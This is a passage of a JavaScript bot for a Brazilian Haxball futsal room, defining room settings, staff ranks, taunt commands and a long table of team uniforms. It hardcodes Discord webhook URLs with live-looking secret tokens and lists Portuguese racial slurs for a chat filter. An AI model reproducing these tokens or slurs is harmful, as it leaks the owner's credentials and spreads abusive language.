module.exports = function(haxToken) {
var serverName = "⚫ HaxLendas | x3 futsal 🟡";
var testMode = false; // Caso for testar alguma novidade na sala, defina como "true". Caso contrário deixe "false".
var modeRoom = "normal"; // Defina como "flash" ou "normal" para o tempo/score da sala serem reformulados automaticamente
var roomName;
var maxPlayers;
var publicRoom = true;
var timeLimit;
var scoreLimit;
let capitão = false;
var vipTag = "";
var urls;
var discord = 'https://discord.gg/u2Be5ZgGaT';
var chatAdmCommand = "!ac";
var comando = "!";
var currentVipValue = 0;
var vipTimeoutIdR;
var vipTimeoutIdB; 
var apostared = {};
var apostablue = {};
var apostas = false;
var auto = false;
var att = JSON.parse(localStorage.getItem("att")) || ["n"];
var odred = 0;
var odblue = 0;
var tagInicialRank = "[Novato]";

let playerConnections = new Map();
let playerAuth = new Map();
let playerIpv4 = new Map();

var provosBuy = {
    1: "Tinha que ser o GORDO DO FEEDBACK...",
    2: "Teste123",
    3: "123Teste",
}

let palavras = ["primata", "negro", "negrinho", "negrinha", "mcc", "m4c4c0", "pretinho", "pretinha", "mono", "mcca", "senzalento", "pretu", "pret4", "pret0"],
    regex = new RegExp(palavras.join("|"), 'gi');

var Hora = new Date(Date.now());
var HoraFormatada = Hora.toLocaleDateString('pt-BR', {
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: 'numeric',
    minute: 'numeric'
});

var messageBlocks = {};
var ignoreCommands = ["!chatoff", "!chaton"];

var ignoreSetMessages = [
    "Você não pode ignorar suas próprias mensagens",
    " foi ignorado com sucesso. Você não verá mais suas mensagens.",
    "Esse jogador já está sendo ignorado.",
    "Não há nenhum jogador com o ID fornecido."
];
var ignoreRemovalMessages = [
    "Essa operação não pode ser executada em si mesmo.",
    "O status de ignorar de  foi removido. Agora você pode ver suas mensagens.",
    "Esse jogador não está na sua lista de ignorados.",
    "Não há nenhum jogador com o ID fornecido."
];

var ignoreMessageSets = [ignoreSetMessages, ignoreRemovalMessages];

var colors2 = [0xFFFF00, 0x00FF00, 0xFFFF00, 0xFF0000, 0xFFFFFF, 0x97FFFF];
var fonts = ["bold", "bold", "bold", "bold", "bold", "bold"];
var sounds = [2, 1, 2, 2, 1, 1];



if (modeRoom == "flash") {
    urls = {
        gameWebhook: ``,
        callAdminWebhook: ``,
        passwordStaffWebhook: ``,
        passwordModWebhook: ``,
        passwordDonoWebhook: ``,
        passwordVipWebhook: ``,
        roomLogChat: ``,
        replayLog: ``,
        errorsWebhook: ``,
        entradas: ``,
        saidas: ``,
        allWebhook: ``,
        transacoes: ``,
        autoBan: ``,
        preRegistro: ``,
        bans: ``
    }
} else if (modeRoom == "normal") {
    urls = {
        gameWebhook: `https://discord.com/api/webhooks/1448460439553048666/fxPEdNf3jtBiE-5PK4ebI2oDxgX9KsQ9MU-DriWrOkOI7mltBoG-S-ISNMX3vxSuOu7x`,
        callAdminWebhook: `https://discord.com/api/webhooks/1448460528329424971/50GJAAbtdAe-1W2757uIA24x6IibUPzGioduiFHpWG8sWl21SWkttYCTPMmHqYpxevgj`,
        passwordDonoWebhook: `https://discord.com/api/webhooks/1448460614853722273/fskrXKdO4dXW7KDU48NjH0yTZFX9ozO4ah5febmr5vxsBASGNC17PJvpJeMnMp8etL1X`,
        passwordStaffWebhook: `https://discord.com/api/webhooks/1448461682853548032/_okzYxZ0WjB1ExN5RmycfuA9yYGA30tMg5MC7Ajx7bLqyQU12CW2uGPTQt7QC8Je85AO`,
        passwordFundadorWebhook: `https://discord.com/api/webhooks/1448463716529213512/xcgOSRgw16XcSChjJNPyB9hg_h_MSNKHxFdcQM_01C_QWt2JWtoiTZ-MR0AlmGlDS99Q`,
        passwordModWebhook: `https://discord.com/api/webhooks/1448462008369287281/qP2B-RTJ27uE5XBj-5-pRTX_QfktnvBhUxHx1IFMFUpJXcuB0OpV0aWWVkYWUfwvUdum`, 
        passwordVipWebhook: `https://discord.com/api/webhooks/1448462219640701100/hGWs7cBNQJ2xFTvANldzHDFLDvr_sFsN-hUvhRFUZdu-c7FtW02FUW6514N9tZYEVgyN`,
        roomLogChat: `https://discord.com/api/webhooks/1448462588085014569/oYcc_BNe6DlR2NU1VbWt9zRzdN88ziS9XDl1Pk14TDq9yWcivTGIW4glGvH2uLYs7oq4`,
        replayLog: `https://discord.com/api/webhooks/1453495084740776111/nglBtK2TwZtIiivWii6nLwjWCeKAN60CnxtU1kx_qgBMYoshncoDhGB-g5inbMKmMHKO`,
        errorsWebhook: ``,
        entradas: `https://discord.com/api/webhooks/1448457601938358325/AEu2f_ZFKAOf_gOo7euGN5I7eLSIxPEbrIkQboBE4d_ucjFH98pr3cRcC-DNnsOijsZ6`,
        saidas: `https://discord.com/api/webhooks/1448461216950386822/dkpwNtlWK2_u5Py_GN1lD8mZ25Ph9faaDSAaMt-oao5jlQfS_Z3X6f1ZAPfuaverymc7`, 
        allWebhook: ``,
        transacoes: ``,
        autoBan: `https://discord.com/api/webhooks/1448461380566126683/d3A8xVByUSvZxIB2hdJuUN5USv3v22BfdXlpV8L2fRu7Y_X8i_LRp4flaINuNWBeulEK`,
        preRegistro: ``,
        bans: `https://discord.com/api/webhooks/1448461380566126683/d3A8xVByUSvZxIB2hdJuUN5USv3v22BfdXlpV8L2fRu7Y_X8i_LRp4flaINuNWBeulEK`
    }
}

if (testMode === true) {
    roomName = "TESTE";
    publicRoom = false; 
    maxPlayers = 30;
    timeLimit = 0;
    scoreLimit = 1;
} else {
    if (modeRoom == "flash") {
        console.log('a')
        timeLimit = 1;
        scoreLimit = 1;

        roomName = `${serverName} | X3 | FLASH
        `;
        publicRoom = true;
        maxPlayers = 30;
    } else if (modeRoom == "normal") {
        console.log('b')
        timeLimit = 3;
        scoreLimit = 3;

        roomName = `${serverName}`;
        publicRoom = true;
        maxPlayers = 30;
    }
}

var room = HBInit({
        roomName: serverName, // Pega o nome que você digitou no Discord
        maxPlayers: maxPlayers,
        public: publicRoom,
        noPlayer: true,
        token: haxToken,       // Pega o token que você colou no Discord
        geo: {"lat":-19.9883149, "lon":-44.0219179,"code":"br"}
    });

var tentativasvip = []
var umdia = 1000 * 60 * 60 * 24;

var vipNames = {
    1: `vip HxL`,
    2: `vip basic`,
    3: `vip deluxe`,
    4: `vip premium`,
}

var config = {
    cargos: {
        fundador: ` [Fundador] `,
        dono: ` [dev] `,
        gerente: `[Gerente] `,
        administrador: `[Admin] `,
        Admin: `[Admin-temp] `,
        moderador: ` [Moderador] `,
    },
    frases: {
        noPermission: `Você não tem permissão para utilizar este comando.`,
        errorCommand: `Ocorreu um erro ao executar este comando...`
    }
};

// Bot desenvolvido pelo OBL
var authbanida = []; //  auth banida
var connbanida = []; //  conn banida
var ipbanido = []; //  ip banida
var nomebanido = []; //  nome banida


const cores = {
    amarelo: 0xFFFF00,
    verde: 0x00FF00,
    vermelho: 0xFF0000,
    azul: 0x0000FF,
    roxo: 0x800080,
    laranja: 0xFFA500,
    rosa: 0xFFC0CB,
    marrom: 0x8B4513,
    cinza: 0x808080,
    preto: 0x000000,
    branco: 0xFFFFFF,
    dourado: 0xFFD700,
    prata: 0xC0C0C0,
    turquesa: 0x40E0D0,
    violeta: 0xEE82EE,
    amareloEscuro: 0xFFD700,
    verdeLimao: 0x32CD32,
    ciano: 0x00FFFF
};

var commandStatNameTranslation = {
    jogos: "games",
    vitorias: "wins",
    gols: "goals",
    assistencias: "assists",
    cs: "cs"
};

var statNameTranslation = {
    games: 'Jogos',
    wins: 'Vitórias',
    winrate: 'Taxa De Vitória',
    goals: 'Gols',
    assist: 'Assistencias',
    ownGoals: 'Gols Contras',
    cs: 'cs'
    
}

var provocacoes = '!ali, !arn, !atk, !band, !bnh, !bnh2, !bnh3, !cag, !calc, !cham, !chu, !cff, !cru, !dboa, !dboa2, !def, !dig, !dmr, !faz, !fal, !fé, !fe, !fran, !fran2, !frio, !fru, !gira, !glç, !grl, !gol, !hum, !ini, !lad, !lç,  !mar,  !olho, !olhu, !pç, !pick, !pint, !pip, !proi, !ptz, !qdf, !qbl, !qjo, !qgo, !qse, !rcl, !rpz, !rvz, !sai, !sac, !sap, !sdg, !ski, !siu, !taf, !tira, !tnc, !ui, !ui2, !uu, !vira, !volt, !vl, !x, !zag, !zen, !divisao, !quentin, !logica, !base, !meto2, !boa, !bai, !bag, !bike, !bch, !bpa, !brb, !cal, !fome, !fds, !jlu, !itk, !fzl, !gen, !kk, !lae, !mal, !mal2, !mal3, !mds, !nice, !trave, !puskas, !bolso, !pika, !papai, !seupai, !peganunca, !quentin2, !izi, !piden, !qsl, !system, !oi, !toma, !ifood, !chute, !moscou, !chora, !red, !blue, !paired, !paiblue, !pegala, !perdoa, !perdoa2, !receba, !meto, !pega, !toca2, !toca, !gk, !gk2, !gk3, !gk4, !gk5, !bobiu, !oe, !sab, !no recoil, !seco, !pato, !mb, !sor, !can, !flo, !frz, !zap, !tro, !cus, !nof, !pas, !bir, !pipoca, !imp, !tan, !gol2, !ret, !vem, !lixe, !noj, !inc, !banho, !thigas, !obl, !obl2, !berg, !berg2, !lgbt';
var categorias = 'Categorias de uniformes: !selecoes, !brasileiros, !outros, !estrangeiros, !vipuni, !uniespeciais'
var selecoes = 'Seleções: !bra, !ale, !arg, !hol, !eua, !fra, !por, !egi, !uru, !ru, !marro, !mona, !esp, !ara, !afeg, !alb, !argé, !mex, !csul, !croa'
var brasileiros = 'Obs: Alguns unis possuem até 3 opções, exemplo: !bah, !bah2, !bah3\nSérie A: !cam, !cap, !amg,  !bah, !bot, !cor, !corit, !cru, !cui, !fla, !flu, !fort, !goi, !int, !gre, !pal, !brag, !san, !sp, !vas\nSérie B: !sam, !cha, !rec, !vit, !cea, !abc, !ava, !vila, !lond, !itu, !acg, !tom, !botsp, !crb, !cri, !gua, !juv, !mir, !nov, !pont\nSérie C: !pay, !csa, !mana, !alt, !ama, !ame, !apa, !botpb, !bru, !conf, !fig, !flo, !nau, !ope, !pou, !rem, !sb, !sj, !vr, !ypi\nSérie D: !trem, !tocan, !santc, !glo, !alago, !brasil, !andre, !ferro, !brapel'
var outros = 'Outros: !pr, !ibis'
var estrangeiros = 'Estrangeiros: !mcy, !bay, !intm, !mil, !chel, !bar, !rm, !boru, !liv, !psg, !bdm, !juve, !alhi, !alah, !alna, !bj, !inde, !pen, !riv, !tig, !atl, !estre, !feye, !estu, !olim, !raci, !vele, !ars'
var vipuni = 'Vips: !xesn, !gg, !wp, !sev, !two, !on, !faz, !faz2, !faz3, !faz4'
var novos = `- Brasileiros: !pal, !pal2, !pal3, !san, !fla, !sp, !sp2, !brag, !brag2, !brag3, !flu2, !flu3, !corit, !corit2, !corit3, !inter2, !inter3, !gre2, !gre3, !amg, !amg2, !fort, !fort2, !ami, !ami2, !ami3, !cru, !cru2, !cru3 
    - Estrangeiros: !colo, !olim, !bolivar, !alll, !emlc, !oncds, !dtar, !atn, !sl, !lus, !defj
    - Outros: !alain, !mazb, !rajs`;

var uniVIP = {
    '!xesn': [0, 0xFFFFFF, [0x000000, 0xFF9305, 0x000000]],
    '!gg': [60, 0xF7F7F7, [0xC2C2C2, 0xA8A8A8, 0x8C8C8C]],
    '!wp': [60, 0x82FFFF, [0x0CBDC9, 0x0A9EA8, 0x07757D]],
    '!sev': [50, 0x9C971A, [0x292929, 0x141414, 0x080808]],
    '!two': [50, 0x000000, [0xCE93FC, 0xA173C4, 0x7E5A99]],
    '!on': [0, 0x15FF0D, [0x000000]],
    '!faz': [60, 0xFF5D52, [0XFF0000, 0XCC0000, 0XA10000]],
    '!faz2': [60, 0xA39043, [0xFFE169, 0xE6CB5F, 0xD9C059]],
    '!faz3': [60, 0x295BFF, [0x1600D4, 0x1200B3, 0x0F0091]],
    '!faz4': [90, 0xD1FFBD, [0xD69004, 0x16960D, 0xD10000]]
};

var uniVIP2 = {
    '!vip1': {
        1: [0, 0xFFFFFF, [0x000000, 0xFF9305, 0x000000]],
        2: [60, 0xF7F7F7, [0xC2C2C2, 0xA8A8A8, 0x8C8C8C]],
        3: [60, 0x82FFFF, [0x0CBDC9, 0x0A9EA8, 0x07757D]]
    },
    '!vip2': {
        1: [90, 0xD1FFBD, [0xD69004, 0x16960D, 0xD10000]],
        2: [60, 0x295BFF, [0x1600D4, 0x1200B3, 0x0F0091]],
        3: [0, 0x15FF0D, [0x000000]]
    },
}


var uniList = {
    //Selecoes
    '!bra': [90, 0x40BFFF, [0xFFE600]],
    '!bra2': [90, 0x00CF00, [0x002AFF]],
    '!bra3': [60, 0x1FC90C, [0xF8FF1F]],
    '!ale': [90, 0xFFFFFF, [0x000000, 0xFF1212, 0xFFDD00]],
    '!ale2': [90, 0x3D3D3D, [0x171717]],
    '!ale3': [0, 0xFFFAFA, [0x000000, 0xFF0000, 0xFFA500]],
    '!hol': [60, 0x000000, [0xFF5E00]],
    '!hol2': [60, 0xFF5E00, [0x001347]],
    '!eua': [-40, 0xFFFFFF, [0x001347, 0xFF1C1C, 0x001347]],
    '!eua2': [-40, 0xFFFFFF, [0x001347, 0x1B1296]],
    '!arg': [180, 0x000000, [0xFFFFFF, 0x0099FF, 0xFFFFFF]],
    '!arg2': [90, 0xFFFFFF, [0x2D0059, 0xC300FF]],
    '!fra': [90, 0xFFFFFF, [0x000959, 0xFF121A, 0x000959]],
    '!fra2': [90, 0xFFB94F, [0x000959]],
    '!fra3': [0, 0x05009E, [0x000061, 0xFFFFFF, 0xFF0800]],
    '!por': [-45, 0xFFF700, [0x165200, 0xC20808]],
    '!por2': [90, 0xFFFF00, [0xF00000]], // Bot desenvolvido pelo OBL
    '!por3': [90, 0xEB0000, [0xFFFFFF]],
    '!egi': [60, 0xFFFFFF, [0xF70000]],
    '!egi2': [60, 0x000000, [0xFFFFFF]],
    '!uru': [60, 0x000000, [0x0D9EFF]],
    '!ru': [90, 0xFFFFFF, [0x750000, 0xCF0808, 0xCF0808]],
    '!ru2': [90, 0x000000, [0x1E0A82, 0xFFFFFF, 0xFFFFFF]],
    '!ara': [90, 0x095E00, [0xFFFFFF]],
    '!ara2': [90, 0xFFFFFF, [0x006600, 0x009E00, 0x00E300F]],
    '!marro': [90, 0x000000, [0xDB0000, 0xFFFFFF, 0xFFFFFF]],
    '!marro2': [90, 0xFFFFFF, [0xE30000, 0x007A1C, 0x007A1C]],
    '!mona': [240, 0x000000, [0xFFFFFF, 0xFFFFFF, 0xFF3030]],
    '!esp': [90, 0x000000, [0xFF0000, 0xFFFF00, 0xFF0000]],
    '!esp2': [0, 0xFFFFFF, [0xFF2403, 0xFF0000, 0xFF0000]],
    '!esp3': [90, 0xEB0000, [0xE6E6E6, 0xE3E3E3, 0xE9E9E9]],
    '!afeg': [0, 0xFFFFFF, [0x000000, 0xC70A0A, 0x055716]], //Afeganistão
    '!alb': [0, 0x000000, [0xD10000]], //Albânia
    '!argé': [0, 0xC40000, [0x086E1C, 0xFFFFFF]], //Argélia
    '!mex': [0, 0xFFFFFF, [0x094A02]], //México
    '!csul': [0, 0x000000, [0xFA0019]], //Coreia do Sul
    '!croa': [0, 0xFF0022, [0x000000, 0x061219, 0x000000]], //Croacia

    //Série A
    '!sp': [0, 0x000000, [0x900000, 0xFFFFFF, 0x000000]],
    '!sp2': [90, 0xFF0000, [0xFFFFFF]],
    '!cap': [45, 0xFAFAFA, [0xC90000, 0x000000, 0xC90000]],
    '!cap2': [40, 0xFFFFFF, [0x8B0B0A, 0x1D1D1D, 0x8B0B0A]],
    '!cap3': [40, 0xB4332D, [0xC4C7CE, 0x0E111A, 0xC4C7CE]],
    '!cap4': [240, 0xFFFFFF, [0x0C0A0F, 0x19161D]],
    '!cam': [0, 0xFF0000, [0x000000, 0xFFFFFF, 0x000000]],
    '!bah': [0, 0xFAFAFA, [0x2908FF, 0xFF0000, 0x2908FF]], //bahia
    '!bah2': [0, 0xFFFFFF, [0x03173C, 0xA51B28, 0x03173C]], // Bot desenvolvido pelo OBL
    '!bah3': [40, 0xFFEDDB, [0x21A3D5, 0x21A3D5, 0xBFC0C2]],
    '!fla': [90, 0xFFFFFF, [0xFF0000, 0x000000, 0xFF0000]],
    '!fla2': [90, 0xF5F5F5, [0x000000, 0xA61100, 0x000000]],
    '!cui': [90, 0xFFFFFF, [0xF8F23C, 0x06783C, 0xF8F23C]], //cuiaba
    '!cui2': [60, 0x007F35, [0xEDEEF0, 0xFBDC05, 0xEDEEF0]],
    '!cui3': [60, 0xFFEC7A, [0x60D07A, 0x419D46]],
    '!cru': [90, 0x000000, [0x1515B0]],
    '!cru2': [0, 0xFFFFFF, [0x0600A6]],
    '!cru3': [60, 0xFFFFFF, [0x0063C4, 0x0063C4, 0x0063C4]],
    '!cor': [90, 0x292929, [0xFAFAFA]],
    '!cor2': [90, 0xFFFFFF, [0x1b1c1e]],
    '!corit': [0, 0x0C3B00, [0xFFFFFF, 0x039420, 0xFFFFFF]],
    '!fort': [90, 0xFAFAFA, [0x0B2CBD, 0xD61020, 0x0B2CBD]],
    '!vas': [53, 0xFF0000, [0xFAFAFA, 0x000000, 0xFAFAFA]],
    '!vas2': [53, 0xFF0000, [0x000000, 0xFAFAFA, 0x000000]],
    '!pal': [53, 0xFFFFFF, [0x1D3825]], //palmeiras
    '!pal2': [60, 0x05504C, [0xFFFFFF]],
    '!pal3': [60, 0xEFDD21, [0x7EE3AB]],
    '!pal4': [0, 0xFFFFFD, [0x466329, 0xF0F0F2, 0x466329]],
    '!brag': [0, 0xFF0000, [0xFAFAFA]],
    '!cap2': [56, 0xFFFFFF, [0xFF2121, 0x262626, 0xFF2121]],
    '!flu': [180, 0xFFFFFF, [0x1D3825, 0x961400, 0x1D3825]],
    '!flu2': [0, 0xFAFAFA, [0x0D8267, 0x891021, 0x0D8267]],
    '!bot': [180, 0xFFFFFF, [0x000000, 0x262626, 0x000000]],
    '!bot2': [0, 0x404040, [0x000000, 0xFFFFFF, 0x000000]],
    '!san': [180, 0xFFFFFF, [0x007E87]],
    '!san2': [0, 0x000000, [0xFFFFFF]],
    '!san3': [0, 0xB0B0B0, [0xFAFAFA, 0x101010, 0xFAFAFA]],
    '!goi': [90, 0xFAFAFA, [0x164535]], //goias
    '!goi2': [0, 0xDFE2F1, [0x02424B, 0x047386, 0x02424B]],
    '!goi3': [270, 0x023A47, [0xEDEEF3, 0xEDEEF3, 0x2B515A]],
    '!goi4': [60, 0x01CF4A, [0x0F2A28, 0x0F2A28, 0x0F2A28]],
    '!int': [90, 0xFAFAFA, [0xC90000, 0x990000, 0xC90000]],
    '!gre': [0, 0xFFFFFF, [0x75ACFF, 0x000000, 0x75ACFF]],
    '!amg': [0, 0xFFFFFF, [0x109600, 0x000000, 0x109600]],
    '!amg2': [180, 0x0044FF, [0xFFEDED, 0xFF0D0D]],
    '!amg3': [180, 0xFF00E6, [0x00083B]],

    //Série B
    '!sam': [0, 0x000000, [0xDE0000, 0xFFF700, 0x156B00]], //Sampaio Correia
    '!cha': [0, 0xFAFAFA, [0x007A00, 0x005406, 0x007A00]],
    '!rec': [90, 0xFFFFFF, [0xB30000, 0x000000, 0xB30000]],
    '!vit': [90, 0xFFFFFF, [0xFF0000, 0x000000, 0xFF0000]],
    '!cea': [0, 0x000078, [0x000000, 0xFFFFFF, 0x000000]],
    '!vila': [0, 0xFFFFFF, [0xDE0000]], //Vila Nova
    '!lond': [0, 0x18181A, [0xF5F4EF, 0xA0D9ED, 0xF5F4EF]], //Londrina 
    '!lond2': [60, 0x5DB8E7, [0x182B53, 0x182B53, 0x3D78BC]],
    '!itu': [0, 0xFFFFFF, [0x262138, 0xE6414F, 0x262138]], //Ituano
    '!itu2': [60, 0xB73B53, [0xDEE6F9, 0xCAD4F7]],
    '!acg': [60, 0xFFFFFF, [0xCE323F, 0x192A31, 0xCE323F]], //Atlético Goianiense
    '!acg2': [60, 0x282828, [0xE7E7E7, 0xE64844, 0xE7E7E7]],
    '!acg3': [40, 0xE3E3E3, [0x060606, 0xC10506, 0x060606]],
    '!tom': [60, 0xFF1C1C, [0xE8ECEF, 0xE8ECEF, 0xD1DCD6]], //Tombense
    '!tom2': [60, 0x383838, [0xBE0000, 0xECECEE, 0xBE0000]],
    '!tom3': [0, 0x908F95, [0xB40830, 0xEEEFF3]],
    '!botsp': [90, 0xEAE5EC, [0x000706, 0x85B9D1, 0x85B9D1]], //Botafogo-SP
    '!botsp2': [0, 0xFFFFFF, [0x171111, 0xFF5B52, 0x171111]],
    '!botsp3': [90, 0xEED717, [0xDB1023, 0xEDE5E2, 0x242021]],
    '!crb': [90, 0xFF0000, [0xA80017, 0xFEFEFE]], //CRB
    '!crb2': [90, 0x2A0403, [0xFB2E3F, 0xEDE5E3, 0xFB2E3F]],
    '!crb3': [0, 0xEFFDFE, [0x030303, 0x3E3A51, 0x030303]],
    '!abc': [60, 0x010101, [0xBDCCEB, 0x374049, 0xBDCCEB]], //ABC
    '!abc2': [0, 0x1A191E, [0x515561, 0xAEB1C2, 0x505364]],
    '!ava': [0, 0x053364, [0x024D90, 0xDEDDE2, 0x024D90]], //Avaí
    '!ava2': [90, 0x6FA7CA, [0x004B9E, 0xE6EEF0, 0xE6EEF0]],
    '!cri': [90, 0xFFFFFF, [0xE4C918, 0x0E0E0E, 0xD9D9D9]], //Criciúma
    '!cri2': [90, 0xE0C111, [0x000000, 0xECECEC, 0xECECEC]],
    '!cri3': [0, 0xFFFFFF, [0xDDA510, 0x000000, 0xDDA510]],
    '!gua': [0, 0xFFFFFF, [0x095A53, 0x014842]], //Guarani
    '!gua2': [90, 0x12614C, [0xF4F0EF, 0xF4F0EF, 0x138762]],
    '!gua3': [0, 0xFFFFFF, [0x03C263, 0x004A2F, 0x03C263]],
    '!juv': [0, 0xFFFFFF, [0x0D8E4E, 0xD9D0D1, 0x0D8E4E]], //Juventude
    '!juv2': [120, 0x0BC892, [0xDAD7E8, 0xDAD7E8, 0x289079]],
    '!juv3': [40, 0x8DE342, [0x07060C, 0x07060C, 0x22EB77]],
    '!mir': [60, 0x084334, [0xFFE81C]], // Mirassol
    '!mir2': [60, 0xFFFFFF, [0x1D4840, 0xEFC209, 0x1D4840]],
    '!mir3': [270, 0xBBA242, [0x2A426E]],
    '!nov': [0, 0xFFFFFF, [0xF2B855, 0x1B1C2E, 0xF2B855]], //Novorizontino
    '!nov2': [90, 0x312C3E, [0xC8CDF7, 0xE7AB42]],
    '!nov3': [0, 0xFFFFFF, [0x0C0912, 0xF5EB55, 0x0C0912]],
    '!pont': [40, 0xFFFFFF, [0xD4CED2, 0x02000E, 0xD4CED2]], // Ponte Preta
    '!pont2': [40, 0x000000, [0x1A1227, 0xD9D0D5, 0x1A1227]],
    '!pont3': [40, 0xFFFFFF, [0xCED3D6, 0x575C5F, 0x010302]],

    //Série C
    '!pay': [90, 0x7AF2FF, [0x006FFF, 0x2E9DFF, 0x70B3FF]],
    '!csa': [0, 0x050505, [0x1704C4, 0xFFFFFF, 0x0A22C2]], //CSA
    '!mana': [180, 0xFFFFFF, [0x18AB53, 0x0E7746, 0x18AB53]], //Manaus FC
    '!alt': [90, 0xD0A53F, [0x284E41, 0xD0D4ED, 0x284E41]], //Altos
    '!alt2': [40, 0xFFFF00, [0xEEF0F2, 0x036136, 0xEEF0F2]],
    '!alt3': [0, 0x2B875A, [0x000009, 0x051A6A, 0x000009]],
    '!ama': [60, 0x030100, [0xEEB72F]], //Amazonas
    '!ama2': [60, 0xFCEB00, [0x020000]],
    '!ama3': [60, 0xFAC208, [0xF6F6F6]],
    '!ame': [270, 0xFDFDFF, [0xE90216, 0xFC0A20]], //América de Natal
    '!ame2': [60, 0xB7040A, [0xF2F2F2]],
    '!ame3': [90, 0xA02B3E, [0x32435D, 0xE4CBAD, 0x32435D]],
    '!apa': [90, 0xB0983E, [0x172238, 0x192A48]], //Aparecidense
    '!apa2': [60, 0x24324F, [0xB9BCDF]],
    '!apa3': [60, 0xE0D2A1, [0x2A3144, 0x2A3144, 0x2862AC]],
    '!botpb': [0, 0xD40D12, [0x2E2331, 0xE6EDF5, 0x2E2331]], //Botafogo PB
    '!botpb2': [60, 0x000000, [0xE6E6E8, 0xD1D1D9]],
    '!botpb3': [60, 0xD4E0EC, [0x050505]],
    '!bru': [90, 0xFFFF00, [0xC71721, 0x00893B, 0xE1E1E1]], //Brusque
    '!bru2': [70, 0x130C06, [0x045743, 0xBF2A30, 0xCBBB10]],
    '!bru3': [0, 0xFFFFFF, [0x313D49, 0x171A21]],
    '!conf': [90, 0xFFFFFF, [0x1F4097, 0x1F4097, 0xF8F0F7]], //Confiança
    '!conf2': [0, 0x0080FF, [0xFFFFFF, 0xFFFFFF, 0x0C1050]],
    '!conf3': [0, 0xFFFFFF, [0x03C0F8, 0x5CC4CD, 0x8BCDC9]],
    '!fig': [0, 0x000000, [0x222222, 0xE2E2E2, 0x222222]], //Figueirense
    '!fig2': [90, 0x0F1110, [0xEDEEF5, 0xEDEEF5, 0x161A1E]],
    '!fig3': [60, 0xE7A73D, [0x020000]],
    '!flo': [0, 0xFFFFFF, [0x2A5D4A, 0x5DC68D, 0x2A5D4A]], //Floresta
    '!flo2': [0, 0x2B6A57, [0xF2F0FD, 0x30A669, 0xF2F0FD]],
    '!flo3': [0, 0x15191A, [0x2DCCC7, 0x04AEAD]],
    '!nau': [0, 0xFF1414, [0xC10100, 0xDEE2E3, 0xC10100]], //Náutico
    '!nau2': [60, 0xCE2034[0xE2E4F6]],
    '!nau3': [0, 0xFFFFFF, [0xE91A22, 0xE20D11]],
    '!ope': [0, 0x000000, [0x131517, 0xF7F6F9, 0x131517]], //Operário PR
    '!ope2': [60, 0x000000, [0xFEFEFE]],
    '!ope3': [40, 0x5B595A, [0x020202, 0xF1F1F1]],
    '!pou': [40, 0xFFFFFF, [0xDAD3CB, 0xCA0415, 0x100E0F]], //Pouso Alegre
    '!pou2': [0, 0xFFFFFF, [0xBF1F11, 0x1A1617, 0xBF1F11]],
    '!pou3': [90, 0xFFFFFF, [0xCC3F52, 0x000000, 0x000000]],
    '!rem': [60, 0xFFFFFF, [0x191828]], //Remo
    '!rem2': [60, 0x232639, [0xDCDCDC]],
    '!rem3': [0, 0xF2F2F2, [0x0E0E0E, 0x362035, 0x0E0E0E]],
    '!sb': [60, 0xF1CD37, [0x0F0F0F]], //São Bernado
    '!sb2': [60, 0x101010, [0xDCA63C]],
    '!sb3': [270, 0xEBC630, [0xE3DEE5, 0xE3DEE5, 0x26272B]],
    '!sj': [60, 0xD8DDCE, [0x201A79]], //São José RS
    '!sj2': [60, 0x2413A6, [0xEAF7F0]],
    '!sj3': [90, 0x091646, [0xE6C63F, 0xE1BF30]],
    '!vr': [0, 0xFFF7F7, [0xFECB18, 0x232428, 0xFECB18]], //Volta Redonda
    '!vr2': [64, 0x000000, [0xF5DD00, 0xDBC500, 0xCCB800]],
    '!vr3': [64, 0x41DB00, [0x141414, 0x191919, 0x212121]],
    '!vr2': [0, 0x20232D, [0xFFFFFF, 0xCCC9CD, 0xF7F5F5]],
    '!vr3': [90, 0xFFFFFF, [0xFEF600, 0x000000, 0x000000]],
    '!ypi': [60, 0x005238, [0xFEE600]], //Ypiranga de Erechim
    '!ypi2': [60, 0xFFFFFF, [0x00704F]],
    '!ypi3': [0, 0x5A6794, [0xC0DAE9, 0x68A4C8]],

    //Série D
    '!trem': [90, 0xF3F8F4, [0xFF0018, 0x2F2929, 0xFF0018]],//Trem Desportivo
    '!trem2': [0, 0xD9D7D8, [0x0F161E, 0xC6001A]],
    '!tocan': [60, 0xF2F3EE, [0x4C9E65]],//Tocantinópolis
    '!tocan2': [60, 0x77C977, [0xFCFEFB]],
    '!santc': [90, 0xFFFFFF, [0x050409, 0xCA2E3B]],//Santa Cruz
    '!santc2': [90, 0x181B2A, [0xF1F2F7, 0xE04447]],
    '!glo': [90, 0xFFFFFF, [0xCD455B, 0x171516]],//Globo
    '!glo2': [90, 0xFFFFFF, [0x000000, 0x621825, 0xA27615]],
    '!alago': [0, 0xEDEDED, [0x232832, 0xBF3443]],//Atlético de Alagoinhas
    '!alago2': [90, 0xFFFFFF, [0x121116, 0x980611]],
    '!alago3': [60, 0xD2C76D, [0x0E0F14]],
    '!brasi': [0, 0x1C6A12, [0xEA9A01, 0xEA9A01, 0xE7E7E7]],//Brasiliense
    '!brasi2': [60, 0xFCFA05, [0x0D0B18]],
    '!andre': [60, 0x112379, [0xE4E7EE]],//Santo André
    '!andre2': [230, 0xE9EBE6, [0x1633B5, 0x22245D]],
    '!ferro': [60, 0xEEF2FB, [0x412B2E]],//Ferroviária
    '!ferro2': [60, 0x432A2E, [0xEDF3F3]],
    '!brapel': [60, 0x454648, [0xF57582]],//Brasil de Pelotas
    '!brapel2': [45, 0xFCFCFC, [0xBD2232, 0x111113]],

    //Outros
    '!pr': [0, 0xFFFFFF, [0xE30000, 0x0006BF]],
    '!ibis': [90, 0xDADFE3, [0x332C34, 0x822A38, 0xE13F4C]], //Ibis
    '!ibis2': [90, 0xFFFFFF, [0x000000, 0x8C0000, 0xC90000]],
    '!loud': [1, 0x1CFF33, [0x000000]],
    '!lsg': [1, 0x000000, [0xFFA319]],
    '!c9': [1, 0x2EF8FF, [0xFFFFFF]],
    '!furia': [1, 0xFFFFFF, [0x000000]],
    '!fx': [0, 0xFFFFFF, [0x000000, 0xBA19FF, 0x000000]],
    '!bronze': [1, 0x8C7853, [0x8C7853]],
    '!ouro': [1, 0xFFD700, [0xFFD700]],
    '!prata': [1, 0xC0C0C0, [0xC0C0C0]],
    '!diamante': [1, 0x0CDED8, [0x0CDED8]],

    //Estrangeiros
    '!atl4': [180, 0x333333, [0xFAEDED, 0x000000]],
    '!juve': [180, 0xFFFFFF, [0x000000]],
    '!psg': [60, 0xFFFFFF, [0x001C38]],
    '!psg2': [60, 0x000000, [0x6000A1, 0xFF00FF]],
